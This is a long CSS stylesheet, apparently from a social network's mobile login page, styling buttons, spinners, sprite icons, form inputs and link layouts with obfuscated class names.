        ._56bs._56b_ {
            display: block;
            width: 100%
        }

        a._56bs._56b_,
        span._56bs._56b_._2347,
        span._56bs._56b_ ._2347 {
            display: block;
            width: auto
        }

        ._55i1 {
            background: transparent;
            border: none;
            box-sizing: border-box;
            color: #1d2129;
            display: none;
            font-size: 14px;
            height: 44px;
            line-height: 44px;
            margin: 0;
            padding: 0 24px;
            position: relative;
            width: 100%
        }

        ._58a0 {
            display: block;
            font-weight: 700;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        ._7j3y {
            color: #90949c;
            font-size: 12px;
            font-weight: 400;
            height: auto;
            line-height: normal;
            overflow: visible;
            padding: 16px 24px;
            white-space: normal
        }

        ._55i0 ._58a0 {
            display: inline-block;
            width: auto
        }

        ._55i1.touched {
            position: relative;
            z-index: 3
        }

        ._58a0.touched:after {
            background-color: #dadde1;
            border-radius: 2px;
            bottom: 2px;
            content: '';
            left: 2px;
            position: absolute;
            right: 2px;
            top: 2px;
            z-index: -1
        }

        ._55i0 ._55i1:first-child {
            border-bottom-left-radius: 3px;
            border-top-left-radius: 3px;
            border-top-right-radius: 0
        }

        ._55i0 ._55i1:last-child {
            border-bottom-left-radius: 0;
            border-bottom-right-radius: 3px;
            border-top-right-radius: 3px
        }

        ._55i0 ._55i1:only-child {
            border-radius: 3px
        }

        .touch ._58a0~._58a0:before {
            background-image: linear-gradient(to right, rgba(200, 200, 201, 0) 0%, rgba(200, 200, 201, 1) 50%, rgba(200, 200, 201, 0) 100%);
            content: '';
            height: 1px;
            left: 0;
            position: absolute;
            top: 0;
            width: 100%;
            z-index: 2
        }

        .touch ._55i0 ._58a0:before {
            background-image: linear-gradient(rgba(200, 200, 201, 0) 0%, rgba(200, 200, 201, 1) 50%, rgba(200, 200, 201, 0) 100%);
            bottom: 1px;
            height: auto;
            top: 1px;
            width: 1px
        }

        .x2 ._58a0~._58a0:before {
            border-bottom: 1px solid #fff;
            transform: translateY(-.5px) scaleY(.5)
        }

        .x2 ._55i0 ._58a0~._58a0:before {
            border-right: 1px solid #fff;
            border-top-style: none;
            transform: translateX(-.5px) scaleX(.5)
        }

        ._55i1._53n6 {
            box-sizing: border-box;
            height: 50px;
            padding-left: 12px;
            padding-right: 12px;
            text-align: left
        }

        ._53n6 ._320u {
            bottom: 0;
            left: 0;
            position: absolute;
            text-align: center;
            top: 0;
            width: 44px
        }

        ._53n6 ._320u:before {
            content: '';
            display: inline-block;
            height: 100%;
            vertical-align: middle
        }

        ._53n6 ._53n7 {
            vertical-align: middle
        }

        ._53n6 ._53n8 {
            line-height: 20px;
            padding-top: 7px
        }

        ._53n6 ._320v {
            line-height: 50px;
            padding-top: 0
        }

        ._53n6 ._53n9 {
            box-sizing: border-box;
            display: inline-block;
            height: 50px;
            line-height: 16px;
            padding-left: 32px;
            width: 100%
        }

        ._320v ._12u6 {
            display: none
        }

        ._5so {
            height: 100%;
            left: 0;
            position: absolute;
            top: 0;
            width: 100%;
            z-index: 11
        }

        ._5so._2wyb {
            background-color: rgba(0, 0, 0, .5)
        }

        .touch ._544l {
            height: 0;
            left: 0;
            position: absolute;
            text-align: left;
            width: 100%
        }

        .accelerate._544l {
            z-index: 12
        }

        ._544k {
            box-sizing: border-box;
            overflow: hidden;
            padding: 16px 0 28px;
            pointer-events: none;
            position: absolute;
            width: 100%
        }

        ._5bo0 {
            border-radius: 3px;
            margin: auto 0;
            pointer-events: auto;
            position: relative;
            text-align: left
        }

        ._55kj {
            margin: auto 8px
        }

        ._54wl {
            margin: auto 16px
        }

        ._556f {
            display: inline-block;
            margin: auto;
            max-width: 100%
        }

        ._99wx._556f {
            max-width: 50%
        }

        ._99wy._556f {
            max-width: 60%
        }

        ._5bn_ {
            bottom: -4px;
            left: 0;
            pointer-events: none;
            position: absolute;
            width: 52px;
            z-index: 1
        }

        ._5bo2 {
            bottom: 0
        }

        ._5bo1 {
            top: 0
        }

        ._5c0e {
            background: #fff;
            border-radius: 3px;
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            z-index: -1
        }

        ._8gq3 ._5c0e {
            margin-right: 5px
        }

        ._5bo1 ._5bn_ {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -53px -25px;
            bottom: auto;
            height: 22px;
            top: -20px
        }

        ._5bo2 ._5bn_ {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -25px;
            bottom: -32px;
            height: 34px
        }

        ._5c0e::after {
            border-image: url(/rsrc.php/v3/ym/r/AZGW9iI2znw.png) 40 45 45 45 repeat;
            border-style: solid;
            border-width: 40px 45px 45px;
            bottom: -28px;
            color: transparent;
            content: '';
            left: -24px;
            pointer-events: none;
            position: absolute;
            right: -24px;
            top: -16px
        }

        .x1-5 ._5c0e::after,
        .x2 ._5c0e::after {
            border-image: url() 80 90 90 90 repeat
        }

        ._5c0f>:first-child {
            border-top-left-radius: 3px;
            border-top-right-radius: 3px
        }

        ._5c0f>:last-child {
            border-bottom-left-radius: 3px;
            border-bottom-right-radius: 3px
        }

        ._544l._27tw {
            width: 80%
        }

        ._55ym {
            animation: rotateSpinner 1.2s linear infinite;
            display: inline-block;
            vertical-align: middle
        }

        ._55yn._55yo {
            background-image: url(/rsrc.php/v3/y3/r/n-uOOobFC9i.png);
            height: 12px;
            width: 12px
        }

        ._55yn._55yp {
            background-image: url(/rsrc.php/v3/yn/r/O1LrqXHR9oZ.png);
            height: 12px;
            width: 12px
        }

        ._55yq {
            background-image: url(/rsrc.php/v3/y2/r/onuUJj0tCqE.png);
            height: 24px;
            width: 24px
        }

        ._5tqs._5tqs {
            animation-play-state: paused;
            display: none
        }

        ._5tqs.async_saving,
        .async_saving ._5tqs {
            animation-play-state: running;
            display: inline-block
        }

        ._2y32 {
            animation-play-state: paused
        }

        ._5d9- {
            animation: none;
            background-repeat: no-repeat
        }

        ._5d9-._55yn {
            background-image: url(/rsrc.php/v3/y-/r/AGUNXgX_Wx3.gif);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 2px;
            height: 16px;
            width: 16px
        }

        ._5d9-._55yq {
            background-image: url(/rsrc.php/v3/yG/r/b53Ajb4ihCP.gif);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 2px;
            height: 32px;
            width: 32px
        }

        @keyframes rotateSpinner {
            0% {
                transform: rotate(0deg)
            }
            100% {
                transform: rotate(360deg)
            }
        }

        .sp_CEOlFfsk4vS {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-size: auto;
            background-repeat: no-repeat;
            display: inline-block;
            height: 16px;
            width: 16px
        }

        .sp_CEOlFfsk4vS.sx_ed536c {
            width: 12px;
            height: 12px;
            background-position: -15px -264px
        }

        .sp_CEOlFfsk4vS.sx_fde990 {
            width: 24px;
            height: 24px;
            background-position: -47px -110px
        }

        .sp_CEOlFfsk4vS.sx_980c4d {
            background-position: -106px -25px
        }

        .sp_CEOlFfsk4vS.sx_f45e92 {
            width: 20px;
            height: 20px;
            background-position: -75px -143px
        }

        .sp_CEOlFfsk4vS.sx_1be6c1 {
            width: 24px;
            height: 24px;
            background-position: -72px -110px
        }

        .sp_CEOlFfsk4vS.sx_33423a {
            width: 24px;
            height: 24px;
            background-position: -97px -110px
        }

        .sp_CEOlFfsk4vS.sx_b200f1 {
            width: 24px;
            height: 24px;
            background-position: 0 -143px
        }

        .sp_CEOlFfsk4vS.sx_e41b46 {
            width: 20px;
            height: 20px;
            background-position: -96px -143px
        }

        .sp_CEOlFfsk4vS.sx_e2d97d {
            width: 12px;
            height: 12px;
            background-position: -28px -264px
        }

        .sp_CEOlFfsk4vS.sx_0276ca {
            width: 12px;
            height: 12px;
            background-position: -41px -264px
        }

        .sp_CEOlFfsk4vS.sx_58229d {
            width: 20px;
            height: 20px;
            background-position: 0 -168px
        }

        .sp_CEOlFfsk4vS.sx_19e1d5 {
            width: 24px;
            height: 24px;
            background-position: -25px -143px
        }

        .sp_CEOlFfsk4vS.sx_108b04 {
            width: 24px;
            height: 24px;
            background-position: -50px -143px
        }

        .sp_CEOlFfsk4vS.sx_fa3b72 {
            background-position: -35px -60px
        }

        .sp_CEOlFfsk4vS.sx_72a56e {
            background-position: -52px -60px
        }

        .sp_CEOlFfsk4vS.sx_69ecf7 {
            width: 12px;
            height: 12px;
            background-position: -54px -264px
        }

        .sp_CEOlFfsk4vS.sx_72d9e6 {
            background-position: -69px -60px
        }

        .sp_CEOlFfsk4vS.sx_e0dd01 {
            background-position: -86px -60px
        }

        .sp_CEOlFfsk4vS.sx_db0b20 {
            background-position: -103px -60px
        }

        .sp_CEOlFfsk4vS.sx_d54713 {
            background-position: -105px -187px
        }

        .sp_CEOlFfsk4vS.sx_7f0ca0 {
            background-position: -21px -210px
        }

        .sp_CEOlFfsk4vS.sx_27b751 {
            background-position: -38px -210px
        }

        .sp_CEOlFfsk4vS.sx_a89880 {
            width: 12px;
            height: 12px;
            background-position: -67px -264px
        }

        .sp_CEOlFfsk4vS.sx_386e5b {
            background-position: -55px -210px
        }

        .sp_CEOlFfsk4vS.sx_7b1d35 {
            background-position: -72px -210px
        }

        .sp_CEOlFfsk4vS.sx_9c3c3f {
            background-position: -89px -210px
        }

        .sp_CEOlFfsk4vS.sx_1f2452 {
            width: 29px;
            height: 30px;
            background-position: -17px -110px
        }

        .sp_CEOlFfsk4vS.sx_59f80c {
            width: 12px;
            height: 12px;
            background-position: -80px -264px
        }

        .sp_CEOlFfsk4vS.sx_10d1aa {
            width: 17px;
            background-position: -17px -60px
        }

        .selected .sp_CEOlFfsk4vS.sx_10d1aa {
            background-position: 0 -60px
        }

        .sp_CEOlFfsk4vS.sx_439282 {
            width: 123px;
            height: 24px;
            background-position: 0 0
        }

        .sp_CEOlFfsk4vS.sx_b12eae {
            background-position: -106px -210px
        }

        .sp_CEOlFfsk4vS.sx_2b719d {
            width: 20px;
            height: 20px;
            background-position: -21px -168px
        }

        .sp_CEOlFfsk4vS.sx_41da89 {
            width: 20px;
            height: 20px;
            background-position: -42px -168px
        }

        .sp_CEOlFfsk4vS.sx_9820a7 {
            width: 12px;
            height: 12px;
            background-position: -93px -264px
        }

        .sp_CEOlFfsk4vS.sx_3c2fc9 {
            width: 32px;
            height: 32px;
            background-position: 0 -77px
        }

        .sp_CEOlFfsk4vS.sx_36e2c1 {
            width: 32px;
            height: 32px;
            background-position: -33px -77px
        }

        .sp_CEOlFfsk4vS.sx_483d0a {
            width: 10px;
            height: 11px;
            background-position: -66px -48px
        }

        .sp_CEOlFfsk4vS.sx_b05b05 {
            width: 10px;
            height: 11px;
            background-position: -77px -48px
        }

        .sp_CEOlFfsk4vS.sx_7d1f8e {
            width: 10px;
            height: 11px;
            background-position: -88px -48px
        }

        .sp_CEOlFfsk4vS.sx_1043b7 {
            width: 12px;
            height: 11px;
            background-position: -53px -48px
        }

        .sp_CEOlFfsk4vS.sx_e46365 {
            width: 18px;
            height: 18px;
            background-position: -64px -169px
        }

        .sp_CEOlFfsk4vS.sx_ad5a21 {
            width: 13px;
            height: 13px;
            background-position: -1px -249px
        }

        .sp_CEOlFfsk4vS.sx_19a8d9 {
            background-position: -106px -169px
        }

        .sp_CEOlFfsk4vS.sx_df7045 {
            width: 14px;
            height: 14px;
            background-position: -16px -248px
        }

        .sp_CEOlFfsk4vS.sx_00f27c {
            width: 20px;
            height: 20px;
            background-position: -84px -168px
        }

        .sp_CEOlFfsk4vS.sx_8af164 {
            width: 20px;
            height: 20px;
            background-position: 0 -189px
        }

        .sp_CEOlFfsk4vS.sx_7fc973 {
            height: 32px;
            background-position: -66px -77px
        }

        .sp_CEOlFfsk4vS.sx_16f9bf {
            height: 32px;
            background-position: -83px -77px
        }

        .sp_CEOlFfsk4vS.sx_9100ae {
            height: 32px;
            background-position: -100px -77px
        }

        .sp_CEOlFfsk4vS.sx_b19eff {
            height: 32px;
            background-position: 0 -110px
        }

        .sp_CEOlFfsk4vS.sx_112fe3 {
            width: 10px;
            height: 9px;
            background-position: -99px -48px
        }

        .sp_CEOlFfsk4vS.sx_1bbc29 {
            width: 20px;
            height: 20px;
            background-position: -21px -189px
        }

        .sp_CEOlFfsk4vS.sx_d2ee7d {
            width: 20px;
            height: 20px;
            background-position: -42px -189px
        }

        .sp_CEOlFfsk4vS.sx_8d2830 {
            width: 20px;
            height: 20px;
            background-position: -63px -189px
        }

        .sp_CEOlFfsk4vS.sx_263fb8 {
            width: 20px;
            height: 20px;
            background-position: -84px -189px
        }

        .sp_CEOlFfsk4vS.sx_d67740 {
            width: 20px;
            height: 20px;
            background-position: 0 -210px
        }

        .sp_CEOlFfsk4vS.sx_75ead9 {
            width: 52px;
            height: 34px;
            background-position: 0 -25px
        }

        .sp_CEOlFfsk4vS.sx_36be3c {
            width: 52px;
            height: 22px;
            background-position: -53px -25px
        }

        .sp_CEOlFfsk4vS.sx_1f1e3f {
            width: 14px;
            height: 14px;
            background-position: -31px -248px
        }

        .sp_CEOlFfsk4vS.sx_dfe53d {
            width: 14px;
            height: 14px;
            background-position: -46px -248px
        }

        .sp_CEOlFfsk4vS.sx_0b87d2 {
            width: 14px;
            height: 14px;
            background-position: -61px -248px
        }

        .sp_CEOlFfsk4vS.sx_495035 {
            width: 14px;
            height: 14px;
            background-position: -76px -248px
        }

        .sp_CEOlFfsk4vS.sx_8ec365 {
            width: 14px;
            height: 14px;
            background-position: -91px -248px
        }

        .sp_CEOlFfsk4vS.sx_ef9798 {
            width: 14px;
            height: 14px;
            background-position: -106px -248px
        }

        .sp_CEOlFfsk4vS.sx_b61183 {
            width: 14px;
            height: 14px;
            background-position: 0 -264px
        }

        .sp_CEOlFfsk4vS.sx_454e38 {
            background-position: 0 -231px
        }

        .sp_CEOlFfsk4vS.sx_0d839a {
            background-position: -17px -231px
        }

        .sp_CEOlFfsk4vS.sx_cbd149 {
            background-position: -34px -231px
        }

        .sp_CEOlFfsk4vS.sx_202991 {
            background-position: -51px -231px
        }

        .sp_CEOlFfsk4vS.sx_1a0b4b {
            background-position: -68px -231px
        }

        .sp_CEOlFfsk4vS.sx_41edbc {
            background-position: -85px -231px
        }

        .sp_CEOlFfsk4vS.sx_2b1a8e {
            background-position: -102px -231px
        }

        #bootloader_xImtVLO {
            height: 42px
        }

        .bootloader_xImtVLO {
            display: block !important
        }

        .touch ._5ui2 ._5dpw {
            text-align: center
        }

        .touch ._5ui3 {
            padding: 6px
        }

        .touch ._44ii b,
        .touch ._44ii .sec {
            font-size: 14px
        }

        .touch ._8x0i {
            -webkit-appearance: none;
            border: none;
            border-radius: 6px;
            box-sizing: border-box;
            display: block;
            font-size: 15px;
            font-weight: 700;
            line-height: 20px;
            min-height: 36px;
            padding: 8px 12px;
            position: relative;
            text-align: center;
            width: 100%
        }

        .touch ._8x0i._8xqj {
            width: auto
        }

        .touch ._8x0i._9oix {
            width: 100%
        }

        .touch ._8x0j {
            background-color: #1877f2;
            color: #fff
        }

        .touch ._8x0j:active {
            background-color: #216fdb;
            color: #ccd0d5
        }

        .touch ._8x0k {
            background-color: #e4e6eb;
            color: #050505
        }

        .touch ._8x0k:active {
            background-color: #cdced3;
            color: #050505
        }

        .touch ._9004 {
            background-color: #e7f3ff;
            color: #1877f2
        }

        .touch ._9004:active {
            background-color: #cde5ff;
            color: #1877f2
        }

        .touch ._8x0i._8x0j:disabled,
        .touch ._8x0i._9004:disabled,
        .touch ._8x0i._8x0k:disabled,
        .touch ._8x0i._8x0j[disabled],
        .touch ._8x0i._9004[disabled],
        .touch ._8x0i._8x0k[disabled] {
            background-color: #e4e6eb;
            color: #bcc0c4
        }

        .touch ._9adg._8x0i._8x0j:disabled,
        .touch ._9adg._8x0i._8x0j[disbaled] {
            background-color: #1877f2;
            color: rgba(255, 255, 255, .5)
        }

        .touch ._qw9 {
            padding: 0
        }

        .touch ._qw9.grouped>.area {
            border: 0;
            border-radius: 0
        }

        .touch ._qw9 .touchableArea.acy.touched {
            background: #efe6ce;
            color: inherit
        }

        .touch ._qw9 .touchableArea {
            margin: 0
        }

        .touch ._qw9 .ib {
            align-items: center
        }

        .touch ._qw9 .ib .img.l {
            margin: 0 8px
        }

        .touch ._4fmw .touchableArea.acy.touched {
            background: #efe6ce;
            color: inherit
        }

        .touch ._4fmw .touchableArea {
            margin: 0
        }

        .touch ._4fmw .ib {
            align-items: center
        }

        .touch ._4fmw .ib .img.l {
            margin: 0 10px 0 7px
        }

        ._1rrd {
            border: 1px solid #3b5998;
            border-radius: 3px;
            color: #3578e5;
            display: block;
            font-size: large;
            height: 18px;
            line-height: 17px;
            margin-right: 1px;
            text-align: center;
            vertical-align: middle;
            width: 18px
        }

        ._3j87 {
            margin: 0 auto
        }

        ._3j87 .img {
            margin: 3px 0
        }

        ._8qtn {
            background: #f5f6f7
        }

        .touch ._5rut {
            margin: 0 auto;
            max-width: 416px
        }

        ._5t67 {
            padding: 56px 36px 0;
            text-align: center
        }

        .touch ._6p39 {
            background: #fff;
            padding: 8px 16px
        }

        .touch ._6p3a {
            justify-content: left
        }

        .touch ._6p30 {
            padding-right: 8px
        }

        html ._3qsy._3qsy {
            border: 1px solid #fa3e3e
        }

        .touch ._3qs- {
            color: #fa3e3e
        }

        .touch ._3qsy {
            border-radius: 4px
        }

        .touch ._4u9z {
            padding: 12px
        }

        .touch ._4u9z._8q3p {
            font-size: 12px;
            height: 40px;
            line-height: 40px
        }

        a._kmt:link {
            background: #4080ff url(/rsrc.php/v3/yM/r/bc-NvHl4o7d.png) no-repeat right 12px center;
            border-radius: 4pt;
            color: #fff;
            display: block;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, '.SFNSText-Regular', sans-serif;
            font-size: 14px;
            font-weight: 700;
            margin-top: 20px;
            padding: 9px 30px 9px 10px;
            text-align: center
        }

        ._5soa ._5rut .other-links {
            padding-bottom: 36px;
            text-align: center
        }

        ._5soa ._5rut .other-links a {
            color: #7596c8;
            font-size: 12px;
            line-height: 16px
        }

        ._5soa ._5rut .other-links span {
            color: #4b4f56;
            font-size: 12px;
            line-height: 16px
        }

        .touch ._5soa ._5rut .other-links._8p_m a {
            color: #7596c8;
            font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
            font-size: 14px;
            line-height: 16px
        }

        .touch ._8p_n a {
            color: #7596c8;
            font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
            font-size: 14px;
            line-height: 16px
        }

        .touch ._8p_o a {
            color: #1877f2;
            font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
            font-size: 14px;
            line-height: 16px
        }

        .touch ._8p_p a {
            color: #1877f2;
            font-family: 'Roboto-Bold', 'Helvetica-Bold', 'sans-serif';
            font-size: 14px;
            font-weight: 700;
            line-height: 16px
        }

        .touch ._8p_q {
            padding-bottom: 6px;
            padding-top: 12px;
            text-align: center
        }

        .touch ._8p_r {
            padding-bottom: 4px;
            padding-top: 6px;
            text-align: right
        }

        ._5soa ._5rut {
            padding: 0 16px
        }

        ._5spm {
            padding-bottom: 1px;
            padding-top: 16px
        }

        ._9hp- {
            padding-bottom: 1px;
            padding-top: 8px
        }

        ._8qta {
            padding-bottom: 1px;
            padding-top: 8px
        }

        ._xo8 {
            margin-bottom: -15px;
            margin-top: 15px
        }

        ._5sob>div>input {
            border-bottom: 1px solid #e5e5e5;
            border-bottom-color: rgba(0, 0, 0, .101);
            border-radius: 0;
            line-height: 20px
        }

        ._5sob>div>input:first-child {
            border-radius: 4px 4px 0 0
        }

        ._5sob>div>input:last-child {
            border-bottom: none
        }

        ._5sob ._1ng0 {
            border-bottom: none
        }

        ._5sob>div>h3 {
            border-bottom: 0
        }

        ._5t3b {
            padding: 12px 0
        }

        html .touch ._5soa ._28le {
            background: #00a400;
            border: none;
            box-shadow: none
        }

        .touch ._5soa ._28le.touched {
            background: #86df81
        }

        .touch ._5t3b a._5t3c {
            height: 36px;
            padding-left: 16px;
            padding-right: 16px;
            padding-top: 5px
        }

        .touch ._5t3b>._5t3c::before {
            background-color: #46a800;
            border-color: #60a62e #519f18 #409701
        }

        .touch ._5t3b>._5t3c.touched::before {
            background-color: #008c00
        }

        .touch ._5t3b>._28le::before {
            background-color: #00a400;
            border: none
        }

        .touch ._5t3b>._28le.touched::before {
            background-color: #86df81
        }

        ._43mg {
            display: block;
            overflow: hidden;
            text-align: center;
            white-space: nowrap
        }

        ._8qtb {
            margin-left: 5%;
            margin-right: 5%;
            margin-top: 10px;
            width: 90%
        }

        ._8qtf {
            margin: 12px 0 4px;
            width: 100%
        }

        ._43mg>span {
            display: inline-block;
            position: relative
        }

        ._43mg>span:before,
        ._43mg>span:after {
            background: #ccd0d5;
            content: '';
            height: 1px;
            position: absolute;
            top: 50%;
            width: 9999px
        }

        ._43mg>span:before {
            margin-right: 15px;
            right: 100%
        }

        ._43mg>span:after {
            left: 100%;
            margin-left: 15px
        }

        ._43mh {
            color: #4b4f56
        }

        ._3bq_ {
            display: block;
            margin-bottom: 10px;
            margin-left: 5%;
            margin-right: 5%;
            overflow: hidden;
            text-align: center;
            white-space: nowrap;
            width: 90%
        }

        ._3bq_>span {
            display: inline-block;
            position: relative
        }

        ._3bq_>span:before,
        ._3bq_>span:after {
            background: #ccd0d5;
            content: '';
            height: 1px;
            position: absolute;
            top: 50%;
            width: 9999px
        }

        ._3bq_>span:before {
            margin-right: 15px;
            right: 100%
        }

        ._3bq_>span:after {
            left: 100%;
            margin-left: 15px
        }

        ._10yp ._5m_u {
            margin: 0 20px
        }

        ._10yp ._10yv {
            padding: 24px 20px 10px
        }

        ._10yp ._9g1d {
            padding: 20px 20px 10px
        }

        ._10yp ._94m9 {
            padding: 20px 20px 10px
        }

        ._8e5_ {
            margin: 16px 0 20px
        }

        ._10yw {
            margin: 20px 0
        }

        ._9g1f {
            margin: 12px 0 22px
        }

        ._94ma {
            margin: 12px 0 22px
        }

        ._10yx {
            text-align: right
        }

        .touch a._10yy {
            color: #7f7f7f;
            display: inline-block;
            padding: 10px
        }

        .touch a._8e60 {
            display: inline-block;
            font-weight: 700;
            padding: 10px
        }

        .touch a._8e61 {
            color: #4267b2;
            font-weight: 700
        }

        .touch a._8e4d {
            color: #7f7f7f;
            display: inline-block;
            font-weight: 700;
            padding: 10px 20px 10px 10px
        }

        .touch a._9g1g {
            color: #1877f2;
            display: inline-block;
            margin: 10px
        }

        .touch a._9g1h {
            color: #606770;
            display: inline-block;
            margin: 10px
        }

        .touch a._94mb {
            color: #1877f2;
            display: inline-block;
            font-weight: 700
        }

        .touch a._94lg {
            color: #606770;
            display: inline-block;
            font-weight: 700
        }

        .touch a._10yz {
            color: #4267b2
        }

        .touch ._6u_2 {
            margin: 20px 0 0
        }

        .touch ._94lh {
            margin-bottom: 15px;
            margin-left: 12px
        }

        .touch ._3dcp {
            cursor: default;
            font-weight: 700;
            padding-bottom: 12px
        }

        .touch ._1syy {
            cursor: default;
            font-weight: 700;
            overflow: hidden;
            padding-bottom: 8px;
            padding-top: 8px
        }

        .touch ._7eif {
            padding-top: 12px
        }

        .touch ._7eig {
            background-color: #fff;
            font-size: 14px;
            height: 36px;
            line-height: 36px
        }

        .touch ._7eig::after {
            border: none
        }

        .touch ._7f_d {
            padding: 12px 10px 6px
        }

        .touch ._7f_4 {
            color: #606770;
            font-size: 12px;
            line-height: 16px
        }

        .touch ._7eih {
            height: 20px;
            left: 16px;
            position: absolute;
            width: 20px
        }

        .touch ._1syz {
            cursor: default
        }

        .touch ._1-z5 {
            height: 0;
            width: 0
        }

        .touch ._47k7 {
            background-color: transparent;
            border-color: lightgray;
            border-radius: 3px;
            border-style: solid;
            border-width: 1px
        }

        .touch ._48n2 {
            background-color: #fff;
            border-color: lightgray;
            border-radius: 3px;
            border-style: solid;
            border-width: 1px
        }

        .touch ._33a- {
            line-height: 40px
        }

        .touch ._33b2 {
            margin: 4px 0 4px 4px
        }

        .touch ._47k8 {
            background-color: transparent;
            padding: 12px
        }

        .touch ._47k9 {
            display: block;
            font-weight: 700;
            padding-bottom: 12px
        }

        .touch ._47ka {
            padding: 10px
        }

        .touch ._5soa ._28lf.touched::before {
            background: #6eadff
        }

        .touch ._5soa ._28lf::before {
            background-color: #1877f2;
            background-image: none
        }

        html .touch ._5soa ._28lf::after {
            border-image: none;
            border-width: 0
        }

        .touch ._5soa ._28lf:disabled {
            color: #fff
        }

        .touch ._5soa ._9cow {
            font-size: 17px;
            height: 40px;
            line-height: 40px
        }

        .touch ._5soa ._9omx {
            font-size: 14px;
            height: 36px;
            line-height: 36px
        }

        .touch ._5soa ._9omz {
            margin-bottom: -36px
        }

        ._9om- {
            margin-top: -4px
        }

        ._9om_ {
            margin-bottom: 36px
        }

        ._9on0 {
            margin-top: -36px;
            padding-top: 36px
        }

        .touch ._5soa ._5rut .other-links._8p_m ._9on1 {
            color: #216fdb;
            font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
            font-size: 14px;
            line-height: 16px
        }

        .touch a._9on1 {
            color: #216fdb;
            font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
            font-size: 14px;
            line-height: 16px
        }

        .touch ._5soa ._9on2.touched::before {
            background: #d0dae5
        }

        .touch ._5soa ._9on2::before {
            background-color: #e7f3ff;
            background-image: none;
            border-radius: 4px
        }

        html .touch ._5soa ._9on2::after {
            border-image: none;
            border-width: 0
        }

        .touch ._5soa ._9on2:disabled {
            color: #fff
        }

        .touch ._5soa ._9on3 {
            background-color: #e7f3ff;
            background-image: none;
            color: #1877f2;
            font-family: Roboto;
            font-size: 14px;
            font-style: normal;
            font-weight: 700;
            height: 36px;
            line-height: 16px;
            text-shadow: none
        }

        .touch ._5soa ._6b64 {
            margin: 12px 0
        }

        .touch ._6r3k {
            font-family: 'Roboto-Regular';
            font-size: 14px;
            line-height: 16px;
            padding-bottom: 8px
        }

        .touch ._8qtl {
            color: #000;
            font-weight: 700;
            padding-top: 16px
        }

        .touch ._96n9 .jx-typeahead-results {
            background-color: #fff;
            border: solid 1px #ccc;
            border-radius: 0 0 2px 2px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, .3);
            box-sizing: border-box;
            width: 100%
        }

        .touch ._96n9 .jx-typeahead-results .jx-result {
            color: #65676b;
            display: block;
            padding: 9px 8px
        }

        .touch ._96n9 .jx-typeahead-results .jx-result.focused {
            background-color: #f5f6f7
        }

        .touch a._9i3l {
            color: #1877f2;
            display: inline-block;
            font-weight: 400;
            line-height: 16px
        }

        ._9i3m {
            text-align: right
        }

        ._9i3n {
            display: inline;
            padding: 12px
        }

        ._9i3o {
            margin: 16px 0
        }

        ._9i3p ._5m_u {
            margin-left: 5%;
            margin-right: 5%;
            width: 90%
        }

        .touch ._9i5t {
            padding-top: 60px
        }

        .touch ._9i5u {
            background-color: #f0f2f5;
            border-color: #ccd0d5;
            border-radius: 2px;
            border-style: solid;
            border-width: thin
        }

        .touch ._9i5v {
            margin: 10px 12px
        }

        .touch ._9i5w {
            left: calc(50% - 12px);
            position: absolute;
            top: calc(50% - 12px)
        }

        .touch ._9i5x {
            background: rgba(0, 0, 0, .3);
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0
        }

        .touch ._5soa ._9jqb.touched::before {
            background: #6eadff
        }

        .touch ._5soa ._9jqb::before {
            background-color: #1877f2;
            background-image: none
        }

        .touch ._5soa ._9jqb:disabled {
            color: #fff
        }

        .touch ._5soa ._9jqb:disabled::before {
            background-color: #6eadff
        }

        .touch ._3-q1 {
            background-color: #eceff5
        }

        .touch ._3-q2 {
            padding: 38px;
            padding-bottom: 12px
        }

        .touch ._4t0x {
            border-radius: 40px;
            margin-bottom: 16px
        }

        .touch ._3-q3 {
            border-radius: 12px;
            margin-bottom: 16px
        }

        .touch ._3-q1 .other-links {
            padding-top: 12px
        }

        .touch ._3-q1 .other-links a {
            color: #90949c
        }

        .touch ._7tb {
            display: none
        }

        .touch a._1x83:link {
            background: #4267b2;
            border-radius: 4pt;
            color: #fff;
            display: block;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, '.SFNSText-Regular', sans-serif;
            font-size: 14px;
            font-weight: 700;
            margin-top: 30px;
            padding: 9px 30px 9px 10px;
            text-align: center
        }

        .touch ._1x84 {
            display: block;
            margin: 30px 0 12px;
            overflow: hidden;
            text-align: center;
            white-space: nowrap
        }

        .touch ._1x84>span {
            color: #90949c;
            display: inline-block;
            font-size: 16px;
            position: relative
        }

        .touch ._1x84>span:before,
        .touch ._1x84>span:after {
            background: #ccd0d5;
            content: "";
            height: 1px;
            position: absolute;
            top: 50%;
            width: 9999px
        }

        .touch ._1x84>span:before {
            margin-right: 15px;
            right: 100%
        }

        .touch ._1x84>span:after {
            left: 100%;
            margin-left: 15px
        }

        .touch ._4581 {
            margin-top: 10px;
            text-align: center
        }

        .touch ._2di- {
            background-color: #edf2fa;
            height: 5px;
            overflow: hidden;
            position: absolute;
            transition: all 0 ease-out;
            width: 100%;
            z-index: 0
        }

        .touch ._2di_ {
            background-color: #4080ff;
            height: 4px;
            overflow: hidden;
            position: absolute;
            width: 100%
        }

        .touch ._2hda {
            background-color: #1379fb
        }

        .touch ._2hda._5bzu {
            background-color: #3b5998
        }

        .touch ._2hdb {
            padding-bottom: 16px;
            padding-top: 30px;
            text-align: center
        }

        .touch ._29ut ._2hdb {
            padding-top: 0
        }

        .touch ._2hdd {
            color: #fff;
            font-family: "HelveticaNeue-Light", "Helvetica Neue Light", Helvetica Neue, "sans-serif-light", sans-serif
        }

        .touch ._29ut ._2hdd {
            color: #000;
            margin-left: 10%;
            margin-right: 10%
        }

        .touch ._2hd9 ._2hda ._2hdf {
            background-color: transparent
        }

